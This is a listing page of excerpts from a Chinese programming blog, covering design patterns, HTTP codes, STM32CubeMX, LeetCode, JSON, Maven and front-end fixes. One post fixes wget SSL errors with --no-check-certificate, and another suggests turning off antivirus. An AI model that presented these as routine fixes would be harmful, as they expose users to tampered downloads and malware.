代码的可读性高了很多，试想一下如果new了一个Person类，构造函数里传了10个参数，看起来就非常头疼，以后想改某一个值的话，还要去找代码看相应的含义。而Builder模式的可读性就非常高，只需要去修改相应的Builder静态类中的方法即可。 总结 Builder模式与传统的模式相比，并不是完全胜出的，相比之下，Builder模式的代码量会比正常多不少，但是随之带来的好处是代码的可读性和可维护性。但是，往往一个好的设计模式或架构，就是在牺牲某一种能力从而大大增强另一种能力，例如，牺牲一定的可读性，增加项目的可扩展性等等这样的方式。因此，在参数较为复杂，构造对象相对繁琐的情况下，一定要首先考虑使用Builder模式。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46e9096a623e170799456b9114e68a11/" rel="bookmark">
			http响应码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		响应码由三位十进制数字组成。出现在由HTTP服务器发送的响应的第一行。响应码分五种类型，由它们的第一位数字表示： 1XX： 信息 2XX：成功 3XX：重定向 4XX：客户端错误 5XX：服务器错误 常用响应状态码 200： OK，请求成功 201： OK，新的资源建立(post命令) 202： 请求被接受，但处理未完成 204： OK，但没有内容返回 重定向；需要用户代理执行更多的动作 301： 所请求的资源已被指派为新的固定URL 302： 所请求的资源临时位于另外的URL 304： 文档没有修改(条件GET) 客户差错 400： 错误的请求 401： 未被授权；该请求需要用户认证 403： 不明原因的禁止 404： 没有找到 500： 内部服务器差错 501： 没有实现 502： 错误的网关；网关或上游服务器来的无效响应 503： 服务暂时失效 1**：请求收到，继续处理 2**：操作成功收到，分析、接受 3**：完成此请求必须进一步处理 4**：请求包含一个错误语法或不能完成 5**：服务器执行一个完全有效请求失败 100——客户必须继续发出请求 101——客户要求服务器根据请求转换HTTP协议版本 200——交易成功 201——提示知道新文件的URL 202——接受和处理、但处理未完成 203——返回信息不确定或不完整 204——请求收到，但返回信息为空 205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件 206——服务器已经完成了部分用户的GET请求 300——请求的资源可在多处得到 301——删除请求数据 302——在其他地址发现了请求数据 303——建议客户访问其他URL或访问方式 304——客户端已经执行了GET，但文件未变化 305——请求的资源必须从服务器指定的地址得到 306——前一版本HTTP中使用的代码，现行版本中不再使用 307——申明请求的资源临时性删除 400——错误请求，如语法错误 401——请求授权失败 402——保留有效ChargeTo头响应 403——请求不允许 404——没有发现文件、查询或URl 405——用户在Request-Line字段定义的方法不允许 406——根据用户发送的Accept拖，请求资源不可访问 407——类似401，用户必须首先在代理服务器上得到授权 408——客户端没有在用户指定的饿时间内完成请求 409——对当前资源状态，请求不能完成 410——服务器上不再有此资源且无进一步的参考地址 411——服务器拒绝用户定义的Content-Length属性请求 412——一个或多个请求头字段在当前请求中错误 413——请求的资源大于服务器允许的大小 414——请求的资源URL长于服务器允许的长度 415——请求资源不支持请求项目格式 416——请求中包含Range请求头字段，在当前请求资源范围内没有range指示值，请求 也不包含If-Range请求头字段 417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下 一级服务器不能满足请求 500——服务器产生内部错误 501——服务器不支持请求的函数 502——服务器暂时不可用，有时是为了防止发生系统过载 503——服务器过载或暂停维修 504——关口过载，服务器使用另一个关口或服务来响应用户，等待时间设定值较长 505——服务器不支持或拒绝支请求头中指定的HTTP版本 转载自http://dandy-lan.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46e9096a623e170799456b9114e68a11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fa22f1043e8615491aa108ea2ca21b4/" rel="bookmark">
			Linux基本bash命令（持续更新）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先了解下shell Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。
以下是几种shell版本，bash是默认的： sh(全称 Bourne Shell): 是UNIX最初使用的 shell，而且在每种 UNIX 上都可以使用。
Bourne Shell 在 shell 编程方面相当优秀，但在处理与用户的交互方面做得不如其他几种 shell。
bash（全称 Bourne Again Shell）: LinuxOS 默认的，它是 Bourne Shell 的扩展。
与 Bourne Shell 完全兼容，并且在 Bourne Shell 的基础上增加了很多特性。可以提供命令补全，命令编辑和命令历史等功能。它还包含了很多 C Shell 和 Korn Shell 中的优点，有灵活和强大的编辑接口，同时又很友好的用户界面。 csh(全称 C Shell): 是一种比 Bourne Shell更适合的变种 Shell，它的语法与 C 语言很相似。 Tcsh: 是 Linux 提供的 C Shell 的一个扩展版本。
Tcsh 包括命令行编辑，可编程单词补全，拼写校正，历史命令替换，作业控制和类似 C 语言的语法，他不仅和 Bash Shell 提示符兼容，而且还提供比 Bash Shell 更多的提示符参数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fa22f1043e8615491aa108ea2ca21b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37a01bd2947ec406b8d30888e5048b48/" rel="bookmark">
			【立体视觉】世界坐标系、相机坐标系、图像坐标系、像素坐标系之间的关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相机的成像过程涉及到四个坐标系：世界坐标系、相机坐标系、图像坐标系、像素坐标系。这篇博客介绍相机的成像过程，以及四个坐标系之间的装换关系。 相机理想成像模型： 世界坐标系： 客观三维世界的绝对坐标系，也称客观坐标系。因为数码相机安放在三维空间中，我们需要世界坐标系这个基准坐标系来描述数码相机的位置，并且用它来描述安放在此三维环境中的其它任何物体的位置，用（X, Y, Z）表示其坐标值。 相机坐标系（光心坐标系）： 以相机的光心为坐标原点，X 轴和Y 轴分别平行于图像坐标系的 X 轴和Y 轴，相机的光轴为Z 轴，用（Xc, Yc, Zc）表示其坐标值。 图像坐标系： 以CCD 图像平面的中心为坐标原点，X轴和Y 轴分别平行于图像平面的两条垂直边，用( x , y )表示其坐标值。图像坐标系是用物理单位（例如毫米）表示像素在图像中的位置。 像素坐标系： 以 CCD 图像平面的左上角顶点为原点，X 轴和Y 轴分别平行于图像坐标系的 X 轴和Y 轴，用(u , v )表示其坐标值。数码相机采集的图像首先是形成标准电信号的形式，然后再通过模数转换变换为数字图像。每幅图像的存储形式是M × N的数组，M 行 N 列的图像中的每一个元素的数值代表的是图像点的灰度。这样的每个元素叫像素，像素坐标系就是以像素为单位的图像坐标系。 已知一个现实世界中的物体点的在世界坐标系中的坐标为（X, Y, Z），经过相机拍摄得到图片，在图片上的像素坐标为(u , v )。假设在图像坐标系中的坐标为( x , y )，在相机坐标系中的坐标为（Xc, Yc, Zc）。各个坐标之间的转化如下： 像素坐标系与图像坐标系的关系 他们之间的转换关系为： u=xdx+u0 v=ydy+v0 采用齐次坐标再用矩阵形式将上式表示为： ⎡⎣⎢uv1⎤⎦⎥=⎡⎣⎢⎢⎢⎢⎢1dx0001dy0u0v01⎤⎦⎥⎥⎥⎥⎥⎡⎣⎢xy1⎤⎦⎥（1） 其中（u0, v0）是图像坐标系原点在像素坐标系中的坐标，dx 和 dy分别是每个像素在图像平面x和 y方向上的物理尺寸。 图像坐标系与相机坐标系的关系 xf=XCZC yf=YCZC 其中 f 为焦距（像平面与相机坐标系原点的距离）。用齐次坐标系和矩阵表示上述关系： ZC⎡⎣⎢xy1⎤⎦⎥=⎡⎣⎢f000f0001000⎤⎦⎥⎡⎣⎢⎢⎢XCYCZC1⎤⎦⎥⎥⎥（2） 相机坐标系与世界坐标系的关系 ⎡⎣⎢⎢⎢XCYCZC1⎤⎦⎥⎥⎥=[R0Tt1]⎡⎣⎢⎢⎢XYZ1⎤⎦⎥⎥⎥（3） 其中 R 为3 × 3正交旋转矩阵，t 为三维平移向量。 像素坐标系与世界坐标系的关系 由式（1）（2）（3）可得：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1304a1e543ab6c676feef760cae0014f/" rel="bookmark">
			unity改变物体大小的两种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文探讨了两种改变物体大小的方法，一种是通过transform.localscale，另一种是通过改变mesh的顶点坐标。第一种方式并没有真正改变物体大小，只是对物体进行了缩放，物理属性并没有改变。因此，如果要做物理效果，建议使用每二种方式。 using UnityEngine; using System.Collections; /*改变物体大小，GameObject的尺寸由transform.localscale与mesh.Bounds共同决定。 * 另外通过MeshRenderer.Bounds.size可以获取GameoObject的Size*/ public class ChangeGameObjectSize : MonoBehaviour { /// /// 原始mesh顶点坐标,mesh顶点坐标使用物体坐标系。 /// mesh顶点v1的世界坐标=transform.position+new Vector3(v1.x*transform.localscale.x+v1.y*transform.localscale.y+v1.z*transform.localscale.z）; /// 也可以使用unity提供的接口transform.TransformPoint(v1) 将mesh顶点坐标转换为世界坐标. /// string str = ""; /// /// 改变Transfrom.localscale后的mesh坐标，改变Transfrom.localscale,mesh顶点坐标不会改变 /// string str1 = ""; /// /// 改变mesh顶点坐标后的mesh坐标 /// string str2 = ""; Mesh mesh; void Start () { mesh = transform.GetComponent ().mesh; int i = 0; foreach (Vector3 vec in mesh.vertices) { str += vec; Vector3 pos = transform.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1304a1e543ab6c676feef760cae0014f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83ad1132b00af38c9ecfa5cc50bb749a/" rel="bookmark">
			辣鸡数据结构作业：简易银行管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		虽然说是三人合作，但其实基本上是我一个人写的
总的来说，这是个体力活，而且还是个没有任何结构性编程的体力活，就当是我象牙塔时代的一个见证吧
本博文面向大一大二水友。
简易银行卡管理系统
(1)开户：创建一个新的账户，接受用户输入的身份证号，以及账户密码，判断用户输入的身份证号是否唯一且账户密码是否符合要求，如验证成功则为该用户生成一个唯一的帐号。
(2)存款：在用户输入正确的帐号和密码的情况下，接受用户输入的存款金额，并对该帐号的存款信息进行更新。
(3)取款：在用户输入正确的帐号和密码的情况下，接受用户输入的取款金额。取款金额不应该大于当前帐号存款金额，当取款金额不大于当前帐号存款金额时，执行取款操作，并对该帐户的存款信息进行更新。
(4)挂失：在用户输入正确的帐号和密码的情况下，接受用户挂失操作。当帐号挂失后，与该帐号相关的操作都将被禁止。
(5)销户：在用户输入正确的帐号和密码的情况下，接受用户销户。当用户销户后，该帐号将被永久删除。
(6)转帐：在用户输入正确的帐号和密码的情况下，接受用户转账操作，转帐金额不应该大于当前帐号存款金额，当转帐金额不大于当前帐号存款金额时，执行转帐操作，并对该帐户的存款信息及转帐的接受账户的存款信息进行更新。
(7)修改账户密码：在用户输入正确的帐号和密码的情况下，接受用户修改密码操作，用户输入的原密码，若用户输入的密码与原密码匹配，则接受用户输入的新密码，若用户两个输入的密码相同，则修改账户密码，并对数据文件进行更新操作。
(8)查看余额：在用户输入正确的帐号和密码的情况下，接受用户查看余额操作，该模块只涉及数据查询，并不涉及数据文件更新操作。
(9)查看用户交易历史：在用户输入正确的帐号和密码的情况下，接受用户查看用户交易历史操作，系统将显示当前账户的最近的存、取款操作记录，该模块只涉及数据查询，并不涉及数据文件更新操作。
帐号的结构体为Node，存在List这个直接取值法构造的哈希表中，交易历史是一个链表，每个帐号里都包含一个表头。销毁帐号时，将该帐号在哈希表中的位置存在链栈中，下次开户时先从链栈中找空闲的节点。数据库是在txt中读写，比较原始（笑）
上代码
#include "stdafx.h" #include &lt;cstdio&gt; #include &lt;string&gt; #include &lt;fstream&gt; #include "iostream" using namespace std; typedef struct FreeNode { int freePos; FreeNode *next; }; typedef struct Log { char Msg[10]; double Money; Log *next; }Log; typedef struct Node { char ID[20]; char pwd[7]; float money; bool isGua; Log *logHead; bool isCancel; }Node; typedef struct List { Node list[10000]; int num = 1; }List; bool CheckCode(char code[]) { int count = 0; for (int i = 0; code[i] !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83ad1132b00af38c9ecfa5cc50bb749a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/425794408f563f6c4beb1ce6274ed736/" rel="bookmark">
			07-Python遍历&amp;排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.List列表
①、列表遍历
charList = ['H','e','l','l','o'] extList = ['P','y','t','h','o','n'] # 列表遍历1 for value in charList: print(value) # 列表遍历2 for i in range(len(charList)): print(i) # 列表遍历，获取index和value（设置起始遍历索引） for i,value in enumerate(charList,0): print(i,value) # 同时遍历两个列表 for value1,value2 in zip(charList,extList): print(value1,value2) # 反向遍历 for item in reversed(charList): print(item) ②、列表排序
# 列表正序 charList.sort() print(charList) # 列表反序 charList.sort(reverse=True) print(charList) # 列表高级排序：对Item的某个关键字进行排序 L = [('A',1),('C',3),('B',2),('D',4)] # L.sort(lambda x,y:cmp(x[1],y[1])) # Python 2.x # lambda x:x[1] 是一个匿名函数，每次去取L中的元素x（元组），索引为1的值 L.sort(key=lambda x:x[1],reverse=True) print(L) # operator模块提供的itemgetter函数用于获取对象的哪些维的数据，参数为一些序号（即需要获取的数据在对象中的序号） import operator L.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/425794408f563f6c4beb1ce6274ed736/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e899824e8465482a692cce6f86e1b7c/" rel="bookmark">
			leetcode--1. Two Sum
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Given an array of integers, return indices of the two numbers such that they add up to a specific target.
You may assume that each input would have exactly one solution, and you may not use the same element twice.
Example: Given nums = [2, 7, 11, 15], target = 9, Because nums[0] + nums[1] = 2 + 7 = 9, return [0, 1]. class Solution { public: vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) { vector&lt;int&gt; ans; ans.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e899824e8465482a692cce6f86e1b7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1c9fb940d429470e053ec20ec822731/" rel="bookmark">
			leetcode--7. Reverse Integer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Reverse digits of an integer.
Example1: x = 123, return 321 Example2: x = -123, return -321
click to show spoilers.
Note: The input is assumed to be a 32-bit signed integer. Your function should return 0 when the reversed integer overflows.
水题，只是要注意判断是否溢出，一开始忘记判断了
class Solution { public: int reverse(int x) { int tmp = x, ret = 0; while(tmp) { int oldnum = ret; ret = ret * 10 + tmp % 10; if((ret - tmp % 10) / 10 !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1c9fb940d429470e053ec20ec822731/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7724b8218fa7c83fe989bb561941f3fc/" rel="bookmark">
			STM32CubeMX介绍 下载与安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ⅰ、写在前面 相信很多人都知道STM32CubeMX这个工具，也是近年来开发STM32比较流行的一个工具。这个工具从两年前第一版到现在已经有多个版本了，功能也从简单越来越强大了。
STM32CubeMX是一个配置STM32代码的工具，它把很多东西封装的比较好，硬件抽象层、中间层、示例代码等。
现在ST公司升级和维护的库主要就是STM32CubeMX的HAL库和标准外设库，使用这两种库开发STM32各有各的好处，下面简单描述一下。
如果你是一名刚学STM32的初学者，想要把硬件底层相关的东西搞明白，不建议使用STM32CubeMX这个工具，建议使用之前经典的标准外设库来开发（先学习标准外设库，但有必要抽时间了解STM32CubeMX）。标准外设库可以很简单直接跟踪到底层寄存器，而HAL库里面的代码想要跟踪并理解底层很难。
如果你是一名熟练使用标准外设库的人，有必要学习并使用STM32CubeMX来开发程序。
本文内容2016年10月31日更新，且整理成PDF文件，提供给大家下载：
http://pan.baidu.com/s/1geB5TLp
更多关于STM32的文章，可以进入我博客查看：
http://blog.csdn.net/ybhuangfugui
作者：strongerHuang
本文版权所有，未经允许，禁止用于其它商业用途！！！
Ⅱ、STM32CubeMX的介绍 STM32CubeMX是一个图形化的工具，也是配置和初始化C代码生成器（STM32 configuration and initialization C code generation），也就是自动生成开发初期关于芯片相关的一些初始化代码。
从上图可以看得出，它包含了STM32所有系列的芯片，包含示例和样本（Examples and demos）、中间组件（Middleware Components）、硬件抽象层（Hardwaree abstraction layer）。
STM32CubeMX的特性如下：
1.直观的选择 STM32微控制器。
2.微控制器图形化配置：
l 自动处理引脚冲突
l 动态设置确定的时钟树
l 可以动态确定参数设置的外围和中间件模式和初始化
l 功耗预测
3.C代码工程生成器覆盖了STM32微控制器初始化编译软件，如IAR、KEIL、GCC。
4.可独立使用或作为 Eclipse插件使用。
STM32CubeMX是ST意法半导体的主动原创工具，它可以减轻开发的时间和费用。STM32CubeMX集成了一个全面的软件平台，支持STM32每一个系列的MCU开发。这个平台包括 STM32Cube HAL（一个 STM32的抽象层集成软件，确保STM32系列最大的移植性）。再加上兼容的一套中间件（RTOS、USB、TCP/IP和图形），所有内嵌软件组件附带了全套例程。
更多关于STM32CubeMX介绍可以进入ST官网查看。
Ⅲ、下载 JRE、STM32CubeMX工具和库可以到官网下载，也可以在我的百度网盘下载（定期更新）。下面章节讲述的安装也是从官方下载的软件，为了方便大家下载，我将其上传至百度网盘（和官网的一样）。
1.Oracle官方下载JRE 由于STM32CubeMX软件是基于Java环境运行的，所以需要安装JRE才能使用，目前（2016年10月31日）JRE最新版本是jre1.8.0_112。
TM32CubeMX要求JRE最低版本是1.7.0_45，如果你电脑已安装JRE版本大于1.7.0_45，则可以不用再下载安装。
http://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html
接受许可，根据自己电脑系统选择下载（我们以Windows版本为例），如下图：
2.ST官方下载STM32CubeMX工具、库 官网可以下载最新版本的软件，目前（2016年10月31日）STM32CubeMX官方最新版本是V4.17.0。
STM32CubeMX工具、库都在同一个网址下：
http://www.st.com/content/st_com/en/products/development-tools/software-development-tools/stm32-software-development-tools/stm32-configurators-and-code-generators/stm32cubemx.html
A、STM32CubeMX工具
【在网页最下面（如下图），点击网页中“Download”即可下载。（如果没有登录账号会提示“注册”或“登录”）】
B、库下载
【在网页中间偏下（如下图），点击“EMBEDDED SOFTWARE”切换到库软件，选择需要下载的库（看你芯片型号），同样也需要登陆账号，若觉得麻烦，可以在下面百度网盘下载】
3.百度网盘下载 ST官方下载资料或文档需要ST账号登陆成功才能下载，若觉得麻烦可以在我百度网盘下载（定期更新）。为了方便大家下载，我在百度网盘提供下载的版本也是上面官网下载，上传至百度网盘。里面包含STM32CubeMX软件和库。
JRE：http://pan.baidu.com/s/1cML4Hg
STM32CubeMX工具：http://pan.baidu.com/s/1dFMFwHF
STM32CubeMX资料：http://pan.baidu.com/s/1nvcxQC5
注意：由于许多网盘近年来受到影响都相继停止服务或关闭了，如果网盘链接失效，请到官网下载，也可以关注微信公众号查看更新链接，或微信联系作者。
Ⅳ、JRE的安装 STM32CubeMX手册上要求PC安装JRE:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7724b8218fa7c83fe989bb561941f3fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4d74a15e25f1e7bf519c74362af6c62/" rel="bookmark">
			wget因为https和ssl的原因不能下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在使用wget下载过程中，有时会因为https和ssl的原因，出现类似"Unable to establish SSl connection"的错误，导致不能下载。这时可以使用 --no-cookie --no-check-certificate 这两个参数解决。 wget --no-cookie --no-check-certificate http://pypi.python.org/packages/source/s/setuptools/setuptools-0.6c11.tar.gz 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59b75c2da698fa17e5e8620cc02c237f/" rel="bookmark">
			win7 不能新建用户问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		是杀毒软件的 问题 , 把 360 关了就好了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f76e194d0e52ee91e69e1c7202d29d2/" rel="bookmark">
			JSON数组，JSON对象，数组的区别与基本操作整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JSON 语法规则 JSON 语法是 javascript 对象表示语法的子集。 数据在名称/值对中 数据由逗号分隔 花括号保存对象 方括号保存数组 JSON 名称/值对 JSON 数据的书写格式是：名称/值对。 名称/值对组合中的名称写在前面（在双引号中），值对写在后面(同样在双引号中)，中间用冒号隔开： "firstName":"John" JSON 值 JSON 值可以是： 数字（整数或浮点数） 字符串（在双引号中） 逻辑值（true 或 false） 数组（在方括号中） 对象（在花括号中） null JSON正常就是由对象和数组组成，对象使用对象的方法来进行操作。数组使用数组的方法来进行操作。
数组 var ourcountry=[["北京市"],["上海市"],["合肥市","芜湖市","蚌埠市"]]; // 数组 alert(ourcountry[2][1]); JSON对象 var status_process = { " name5" : '闲置期', "name1" : '播种期', "name2" : '苗期', "name3" : '生长期', "name4" : '采收期' } alert(status_process["name5"]); alert(status_process.name5); // 两个都为:闲置期 JSON字符串 所谓json字符串，是指该字符串变量的值与json的格式相同，但是不是json对象，比如：
var s1="{"; var s2 = " 'name5' : '闲置期', 'name1' : '播种期','name2' : '苗期','name3' : '生长期','name4' : '采收期'"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f76e194d0e52ee91e69e1c7202d29d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6247c14af7488bc6780c8e8237662916/" rel="bookmark">
			Maven经典错误之三：was cached in the local repository, resolution will not be reattempted until the upda
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		常见错误：
Multiple annotations found at this line:
- No plugin found for prefix 'war' in the current project and in the plugin groups [] available from the repositories [local (D:\Maven_3\maven\m2\repository), nexus (http://
xxxxx:18888/nexus/content/groups/public)]
- Failure to find org.apache.maven.plugins:maven-resources-plugin:jar:2.6 in http://xxxxx:18888/nexus/content/groups/public was cached in the local repository, resolution will not be reattempted until the update interval of nexus has elapsed or updates are forced
was cached in the local repository, resolution will not be reattempted until the update interval of nexus has elapsed or updates are forced
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6247c14af7488bc6780c8e8237662916/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91398cc144cab9a1652bf963918d2d36/" rel="bookmark">
			Java计算两个日期间的年，月，日之差
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于在开发中需要计算车的使用年限，我当时使用的是以下方案并记录下来，希望能给有需要计算日期差的朋友有所帮助。当然，中间的计算逻辑根据不同要求来计算。 有错的地方请留言告知
/** * 计算使用年限 * enrollDate ：注册日期 * nowDate ： 当前日期或给定日期 */ public void CalculateTheUseYaers (String enrollDate,String nowDate){ SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd"); // 创建日期格式 Calendar c1 = Calendar.getInstance(); // 创建日历对象 Calendar c2 = Calendar.getInstance(); try { c1.setTime(sdf.parse(enrollDate)); c2.setTime(sdf.parse(nowDate)); } catch (ParseException e) { e.printStackTrace(); } int years = c2.get(Calendar.YEAR) - c1.get(Calendar.YEAR); // 计算年度差 int month = c2.get(Calendar.MONTH) - c1.get(Calendar.MONTH);// 计算月度差 int day = c2.get(Calendar.DAY_OF_MONTH) - c1.get(Calendar.DAY_OF_MONTH);// 计算日数差 （DAY_OF_MONTH为月中的天数) int months = years *12 + month; // 计算总共相差的月份数 System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91398cc144cab9a1652bf963918d2d36/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27a663d71c014975691c321923744c60/" rel="bookmark">
			移动端唤起键盘时取消position:fixed定位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当在移动端按钮position:fixed;底部bottom:0;
固定定位后，当唤起键盘输入数据时就会出现很头疼的问题：
固定在底部的按钮会被系统自带的键盘挤上去，占用输入框位置；
如图：
怎么样才能让按钮固定底部，后面找到了两种方式。
HTML
&lt;div class="submit"&gt; &lt;button type="button" class="btn"&gt;提交信息&lt;/button&gt; &lt;/div&gt; css
.submit { display: flex; width: 100%; justify-content: center; position: fixed; bottom: 0; } 1.第一种
通过输入框input获取焦点/移除焦点 来控制按钮的position样式；
js
$("input,textarea").focus(function(){ $(".submit").css("position","static"); }).blur(function(){ $(".submit").css("position","fixed"); }); 效果是实现了，但是后面发现一个问题，如图：
会发现按键没有显示完整。
2.第二种
需要了解 resize()
通过resize() 方法触发 resize 事件，或规定当发生 resize 事件时运行的函数。
js
var windheight = $(window).height(); /*未唤起键盘时当前窗口高度*/ $(window).resize(function(){ var docheight = $(window).height(); /*唤起键盘时当前窗口高度*/ if(docheight &lt; windheight){ /*当唤起键盘高度小于未唤起键盘高度时执行*/ $(".submit").css("position","static"); }else{ $(".submit").css("position","fixed"); } }); 运行后显示效果
唤起时：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27a663d71c014975691c321923744c60/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a66869d2ab98e158c7e951bb10c761e/" rel="bookmark">
			简单的个人健康记录系统（Android&#43;Web）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开发工具及环境：
Eclipse、SQL Server、JDK、JRE、Android SDK、ADT；
前期工作准备：
1.搭配Java开发环境；
2.配置Android开发环境；
3.在Eclipse里安装ADT插件；
开发的个人健康记录系统是个什么样子呢？A（病人）通过客户端将个人健康数据发送给服务器端上的B（医生），B查看信息后及时反馈一些医疗建议给A；在发送数据的同时，服务器将数据存入SQL数据库；客户端与JSP网站都可以对数据库进行操作。
1.客户端布局：
布局比较简单，整体用的ScrollView滚动视图来显示全部内容，除去文字用的TextView，剩下的是Button以一定间隔排列；Button左右都是图片，中间是文字。
用户点击不同的Button出现的窗口也不同，点击Filter时进行数据库内容筛选，可以选择显示一条记录里的某几项数据或者选择某个时段内的个人健康记录。
响应点击事件的代码如下：
suggest7.setOnClickListener(new Button.OnClickListener() { @Override public void onClick(View arg0) { // get prompts.xml view LayoutInflater li = LayoutInflater.from(context); View promptsView = li.inflate(R.layout.prompts6, null); AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder( context); // set prompts.xml to alertdialog builder alertDialogBuilder.setView(promptsView); final EditText userInput = (EditText) promptsView .findViewById(R.id.editTextDialogUserInput); // set dialog message alertDialogBuilder .setCancelable(false) .setPositiveButton("OK", new DialogInterface.OnClickListener() { @Override public void onClick(DialogInterface dialog,int id) { // get user input and set it to result // edit text ed07_msg.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a66869d2ab98e158c7e951bb10c761e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/626252d5cbafe4acba59419eafe251dc/" rel="bookmark">
			离散数学中关于自反与反自反的通俗解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前些天发现了一个巨牛的人工智能学习网站，通俗易懂，风趣幽默，忍不住分享一下给大家。点击跳转到教程。 设R是A上的二元关系，二元关系自反：任取一个A中的元素x，如果都有&lt;x,x&gt;在R中，那么就说A在R上是自反的 反自反：任取一个A中的元素x，如果都有&lt;x,x&gt;不在R中，那么就说A在R上是反自反的 在关系矩阵上的表示， 自反：主对角线上的元素都是1 反自反：主对角线上的元素都是0 在关系图上的表示， 自反：每一个顶点都有环 反自反：每一个顶点都自反：任取一个A中的元素x，如果都有&lt;x,x&gt;在R中，那么就说A在R上是自反的 反自反：任取一个A中的元素x，如果都有&lt;x,x&gt;不在R中，那么就说A在R上是反自反的 在关系矩阵上的表示， 自反：主对角线上的元素都是1 反自反：主对角线上的元素都是0 在关系图上的表示， 自反：每一个顶点都有环 反自反：每一个顶点都 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f34385509c73413d027d7494882bbeb/" rel="bookmark">
			LayerClose弹窗关闭刷新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		//LayerClose弹窗关闭 var LayerClose = function(type){ console.log(type); if(typeof type =="undefined"){ return; } // 开始判断 switch(type){ case "self": var index = layer.index layer.close(index); break; case "FrameIndex": var index = parent.layer.getFrameIndex(window.name); layer.close(index); break; case "selfall": layer.closeAll(); //疯狂模式，关闭所有层 break; case "fatherall": parent.layer.closeAll(); //疯狂模式，关闭所有层 break; default: break; } }; var LayerClose2= function(index,type){ if(typeof type =="undefined"){ return; } // 开始判断 switch(type){ case "tips": layer.closeAll('tips'); //关闭所有的tips层 break; case "loading": layer.closeAll('loading'); break; case "iframe": layer.closeAll('iframe'); break; case "
	</div>
	<div class="list__footer clearfix">
